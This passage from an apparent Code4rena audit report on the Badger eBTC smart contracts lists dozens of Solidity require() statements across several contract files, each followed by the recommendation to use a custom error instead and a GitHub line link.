File: contracts/ActivePool.sol

407    require(_newFee <= MAX_FEE_BPS, "ERC3156FlashLender: _newFee should <= MAX_FEE_BPS")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L407](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L407)


#

```
File: contracts/BorrowerOperations.sol

368    require(
369                _stEthBalanceDecrease <= _cdpStEthBalance,
370                "BorrowerOperations: Cannot withdraw greater stEthBalance than the value in Cdp"
371            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L368-L371](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L368-L371)


#

```
File: contracts/BorrowerOperations.sol

463    require(vars.netStEthBalance > 0, "BorrowerOperations: zero collateral for openCdp()!")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L463](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L463)


#

```
File: contracts/BorrowerOperations.sol

541    require(
542                vars.netStEthBalance + LIQUIDATOR_REWARD == _stEthBalance,
543                "BorrowerOperations: deposited collateral mismatch!"
544            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L541-L544](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L541-L544)


#

```
File: contracts/BorrowerOperations.sol

715    require(_deadline >= block.timestamp, "BorrowerOperations: Position manager permit expired")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L715](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L715)


#

```
File: contracts/BorrowerOperations.sol

734    require(
735                recoveredAddress != address(0) && recoveredAddress == _borrower,
736                "BorrowerOperations: Invalid signature"
737            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L734-L737](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L734-L737)


#

```
File: contracts/BorrowerOperations.sol

807    require(
808                _stEthBalanceIncrease == 0 || _stEthBalanceDecrease == 0,
809                "BorrowerOperations: Cannot add and withdraw collateral in same operation"
810            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L807-L810](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L807-L810)


#

```
File: contracts/BorrowerOperations.sol

818    require(
819                _stEthBalanceIncrease != 0 || _stEthBalanceDecrease != 0 || _debtChange != 0,
820                "BorrowerOperations: There must be either a collateral change or a debt change"
821            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L818-L821](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L818-L821)


#

```
File: contracts/BorrowerOperations.sol

826    require(status == 1, "BorrowerOperations: Cdp does not exist or is closed")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L826](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L826)


#

```
File: contracts/BorrowerOperations.sol

831    require(status == 0, "BorrowerOperations: Cdp is active or has been previously closed")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L831](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L831)


#

```
File: contracts/BorrowerOperations.sol

835    require(_debtChange > 0, "BorrowerOperations: Debt increase requires non-zero debtChange")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L835](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L835)


#

```
File: contracts/BorrowerOperations.sol

839    require(
840                !_checkRecoveryModeForTCR(_tcr),
841                "BorrowerOperations: Operation not permitted during Recovery Mode"
842            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L839-L842](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L839-L842)


#

```
File: contracts/BorrowerOperations.sol

846    require(
847                _stEthBalanceDecrease == 0,
848                "BorrowerOperations: Collateral withdrawal not permitted during Recovery Mode"
849            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L846-L849](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L846-L849)


#

```
File: contracts/BorrowerOperations.sol

911    require(
912                _newICR >= MCR,
913                "BorrowerOperations: An operation that would result in ICR < MCR is not permitted"
914            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L911-L914](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L911-L914)


#

```
File: contracts/BorrowerOperations.sol

918    require(_newICR >= CCR, "BorrowerOperations: Operation must leave cdp with ICR >= CCR")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L918](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L918)


#

```
File: contracts/BorrowerOperations.sol

922    require(
923                _newICR >= _oldICR,
924                "BorrowerOperations: Cannot decrease your Cdp's ICR in Recovery Mode"
925            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L922-L925](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L922-L925)


#

```
File: contracts/BorrowerOperations.sol

929    require(
930                _newTCR >= CCR,
931                "BorrowerOperations: An operation that would result in TCR < CCR is not permitted"
932            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L929-L932](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L929-L932)


#

```
File: contracts/BorrowerOperations.sol

936    require(_debt > 0, "BorrowerOperations: Debt must be non-zero")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L936](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L936)


#

```
File: contracts/BorrowerOperations.sol

940    require(
941                _stEthBalance >= MIN_NET_STETH_BALANCE,
942                "BorrowerOperations: Cdp's net stEth balance must not fall below minimum"
943            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L940-L943](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L940-L943)


#

```
File: contracts/BorrowerOperations.sol

947    require(
948                _debtRepayment <= _currentDebt,
949                "BorrowerOperations: Amount repaid must not be larger than the Cdp's debt"
950            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L947-L950](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L947-L950)


#

```
File: contracts/BorrowerOperations.sol

957    require(
958                ebtcToken.balanceOf(_account) >= _debtRepayment,
959                "BorrowerOperations: Caller doesnt have enough eBTC to make repayment"
960            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L957-L960](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L957-L960)


#

```
File: contracts/BorrowerOperations.sol

970    require(
971                _approval != PositionManagerApproval.None,
972                "BorrowerOperations: Only borrower account or approved position manager can OpenCdp on borrower's behalf"
973            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L970-L973](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L970-L973)


#

```
File: contracts/BorrowerOperations.sol

1083    require(amount > 0, "BorrowerOperations: 0 Amount")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1083](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1083)


#

```
File: contracts/BorrowerOperations.sol

1085    require(amount <= maxFlashLoan(token), "BorrowerOperations: Too much")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1085](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1085)


#

```
File: contracts/BorrowerOperations.sol

1091    require(
1092                receiver.onFlashLoan(msg.sender, token, amount, fee, data) == FLASH_SUCCESS_VALUE,
1093                "IERC3156: Callback failed"
1094            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1091-L1094](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1091-L1094)


#

```
File: contracts/BorrowerOperations.sol

1115    require(token == address(ebtcToken), "BorrowerOperations: EBTC Only")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1115](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1115)


#

```
File: contracts/BorrowerOperations.sol

1116    require(!flashLoansPaused, "BorrowerOperations: Flash Loans Paused")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1116](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1116)


#

```
File: contracts/BorrowerOperations.sol

1141    require(
1142                _feeRecipientAddress != address(0),
1143                "BorrowerOperations: Cannot set feeRecipient to zero address"
1144            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1141-L1144](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1141-L1144)


#

```
File: contracts/BorrowerOperations.sol

1155    require(_newFee <= MAX_FEE_BPS, "ERC3156FlashLender: _newFee should <= MAX_FEE_BPS")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1155](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1155)


#

```
File: contracts/BorrowerOperations.sol

145    require(locked == OPEN, "BorrowerOperations: Reentrancy in nonReentrant call")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L145](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L145)


#

```
File: contracts/BorrowerOperations.sol

146    require(
147                ReentrancyGuard(address(cdpManager)).locked() == OPEN,
148                "CdpManager: Reentrancy in nonReentrant call"
149            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L146-L149](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L146-L149)


#

```
File: contracts/CdpManager.sol

332    require(redemptionsPaused == false, "CdpManager: Redemptions Paused")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L332](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L332)


#

```
File: contracts/CdpManager.sol

431    require(totals.collSharesDrawn > 0, "CdpManager: Unable to redeem any amount")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L431](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L431)


#

```
File: contracts/CdpManager.sol

502    require(_toRemoveIds[0] == _start, "CdpManager: batchRemoveSortedCdpIds check start error")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L502](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L502)


#

```
File: contracts/CdpManager.sol

503    require(
504                _toRemoveIds[_total - 1] == _end,
505                "CdpManager: batchRemoveSortedCdpIds check end error"
506            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L503-L506](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L503-L506)


#

```
File: contracts/CdpManager.sol

626    require(newBaseRate > 0, "CdpManager: new baseRate is zero!")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L626](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L626)


#

```
File: contracts/CdpManager.sol

672    require(redemptionFee < _ETHDrawn, "CdpManager: Fee would eat up all returned collateral")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L672](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L672)


#

```
File: contracts/CdpManager.sol

678    require(decayedBaseRate <= DECIMAL_PRECISION, "CdpManager: baseRate too large!")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L678](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L678)


#

```
File: contracts/CdpManager.sol

743    require(
744                callerBalance >= _amount,
745                "CdpManager: Requested redemption amount must be <= user's EBTC token balance"
746            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L743-L746](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L743-L746)


#

```
File: contracts/CdpManager.sol

747    require(
748                callerBalance <= _totalSupply,
749                "CdpManager: redeemer's EBTC balance exceeds total supply!"
750            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L747-L750](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L747-L750)


#

```
File: contracts/CdpManager.sol

754    require(_amount > 0, "CdpManager: Amount must be greater than zero")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L754](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L754)


#

```
File: contracts/CdpManager.sol

758    require(_TCR >= MCR, "CdpManager: Cannot redeem when TCR < MCR")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L758](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L758)


#

```
File: contracts/CdpManager.sol

762    require(
763                _maxFeePercentage >= redemptionFeeFloor && _maxFeePercentage <= DECIMAL_PRECISION,
764                "Max fee percentage must be between redemption fee floor and 100%"
765            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L762-L765](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L762-L765)


#

```
File: contracts/CdpManager.sol

774    require(
775                _stakingRewardSplit <= MAX_REWARD_SPLIT,
776                "CDPManager: new staking reward split exceeds max"
777            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L774-L777](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L774-L777)


#

```
File: contracts/CdpManager.sol

789    require(
790                _redemptionFeeFloor >= MIN_REDEMPTION_FEE_FLOOR,
791                "CDPManager: new redemption fee floor is lower than minimum"
792            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L789-L792](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L789-L792)


#

```
File: contracts/CdpManager.sol

793    require(
794                _redemptionFeeFloor <= DECIMAL_PRECISION,
795                "CDPManager: new redemption fee floor is higher than maximum"
796            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L793-L796](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L793-L796)


#

```
File: contracts/CdpManager.sol

808    require(
809                _minuteDecayFactor >= MIN_MINUTE_DECAY_FACTOR,
810                "CDPManager: new minute decay factor out of range"
811            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L808-L811](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L808-L811)


#

```
File: contracts/CdpManager.sol

812    require(
813                _minuteDecayFactor <= MAX_MINUTE_DECAY_FACTOR,
814                "CDPManager: new minute decay factor out of range"
815            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L812-L815](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L812-L815)


#

```
File: contracts/CdpManagerStorage.sol

112    require(
113                _gracePeriod >= MINIMUM_GRACE_PERIOD,
114                "CdpManager: Grace period below minimum duration"
115            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L112-L115](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L112-L115)


#

```
File: contracts/CdpManagerStorage.sol

261    require(
262                closedStatus != Status.nonExistent && closedStatus != Status.active,
263                "CdpManagerStorage: close non-exist or non-active CDP!"
264            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L261-L264](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L261-L264)


#

```
File: contracts/CdpManagerStorage.sol

453    require(totalStakesSnapshot > 0, "CdpManagerStorage: zero totalStakesSnapshot!")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L453](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L453)


#

```
File: contracts/CdpManagerStorage.sol

466    require(
467                cdpStatus != Status.nonExistent && cdpStatus != Status.active,
468                "CdpManagerStorage: remove non-exist or non-active CDP!"
469            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L466-L469](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L466-L469)


#

```
File: contracts/CdpManagerStorage.sol

475    require(index <= idxLast, "CdpManagerStorage: CDP indexing overflow!")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L475](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L475)


#

```
File: contracts/CdpManagerStorage.sol

556    require(_newIndex > _prevIndex, "CDPManager: only take fee with bigger new index")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L556](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L556)


#

```
File: contracts/CdpManagerStorage.sol

584    require(activePool.getSystemCollShares() > _feeTaken, "CDPManager: fee split is too big")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L584](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L584)


#

```
File: contracts/CdpManagerStorage.sol

649    require(Cdps[_cdpId].status == Status.active, "CdpManager: Cdp does not exist or is closed")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L649](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L649)


#

```
File: contracts/CdpManagerStorage.sol

653    require(
654                CdpOwnersArrayLength > 1 && sortedCdps.getSize() > 1,
655                "CdpManager: Only one cdp in the system"
656            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L653-L656](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L653-L656)


#

```
File: contracts/CdpManagerStorage.sol

660    require(
661                msg.sender == borrowerOperationsAddress,
662                "CdpManager: Caller is not the BorrowerOperations contract"
663            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L660-L663](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L660-L663)


#

```
File: contracts/CdpManagerStorage.sol

242    require(locked == OPEN, "CdpManager: Reentrancy in nonReentrant call")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L242](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L242)


#

```
File: contracts/CdpManagerStorage.sol

243    require(
244                ReentrancyGuard(borrowerOperationsAddress).locked() == OPEN,
245                "BorrowerOperations: Reentrancy in nonReentrant call"
246            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L243-L246](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L243-L246)


#

```
File: contracts/CollSurplusPool.sol

92    require(claimableColl > 0, "CollSurplusPool: No collateral available to claim")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L92](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L92)


#

```
File: contracts/CollSurplusPool.sol

99    require(cachedTotalSurplusCollShares >= claimableColl, "!CollSurplusPoolBal")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L99](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L99)


#

```
File: contracts/CollSurplusPool.sol

113    require(
114                msg.sender == borrowerOperationsAddress,
115                "CollSurplusPool: Caller is not Borrower Operations"
116            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L113-L116](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L113-L116)


#

```
File: contracts/CollSurplusPool.sol

120    require(msg.sender == cdpManagerAddress, "CollSurplusPool: Caller is not CdpManager")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L120](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L120)


#

```
File: contracts/CollSurplusPool.sol

124    require(msg.sender == activePoolAddress, "CollSurplusPool: Caller is not Active Pool")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L124](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L124)


#

```
File: contracts/CollSurplusPool.sol

143    require(token != address(collateral), "CollSurplusPool: Cannot Sweep Collateral")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L143](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L143)


#

```
File: contracts/CollSurplusPool.sol

146    require(amount <= balance, "CollSurplusPool: Attempt to sweep more than balance")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L146](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L146)


#

```
File: contracts/EBTCToken.sol

144    require(cachedAllowance >= amount, "ERC20: transfer amount exceeds allowance")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L144](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L144)


#

```
File: contracts/EBTCToken.sol

165    require(cachedAllowances >= subtractedValue, "ERC20: decreased allowance below zero")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L165](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L165)


#

```
File: contracts/EBTCToken.sol

208    require(deadline >= block.timestamp, "EBTC: expired deadline")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L208](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L208)


#

```
File: contracts/EBTCToken.sol

219    require(recoveredAddress == owner, "EBTC: invalid signature")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L219](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L219)


#

```
File: contracts/EBTCToken.sol

247    require(sender != address(0), "EBTCToken: zero sender!")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L247](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L247)


#

```
File: contracts/EBTCToken.sol

248    require(recipient != address(0), "EBTCToken: zero recipient!")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L248](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L248)


#

```
File: contracts/EBTCToken.sol

251    require(cachedSenderBalances >= amount, "ERC20: transfer amount exceeds balance")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L251](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L251)


#

```
File: contracts/EBTCToken.sol

263    require(account != address(0), "EBTCToken: mint to zero recipient!")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L263](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L263)


#

```
File: contracts/EBTCToken.sol

271    require(account != address(0), "EBTCToken: burn from zero account!")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L271](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L271)


#

```
File: contracts/EBTCToken.sol

274    require(cachedBalance >= amount, "ERC20: burn amount exceeds balance")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L274](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L274)


#

```
File: contracts/EBTCToken.sol

286    require(owner != address(0), "EBTCToken: zero approve owner!")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L286](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L286)


#

```
File: contracts/EBTCToken.sol

287    require(spender != address(0), "EBTCToken: zero approve spender!")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L287](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L287)


#

```
File: contracts/EBTCToken.sol

296    require(
297                _recipient != address(0) && _recipient != address(this),
298                "EBTC: Cannot transfer tokens directly to the EBTC token contract or the zero address"
299            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L296-L299](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L296-L299)


#

```
File: contracts/EBTCToken.sol

300    require(
301                _recipient != cdpManagerAddress && _recipient != borrowerOperationsAddress,
302                "EBTC: Cannot transfer tokens directly to the CdpManager or BorrowerOps"
303            )
```
 use custom error instead 

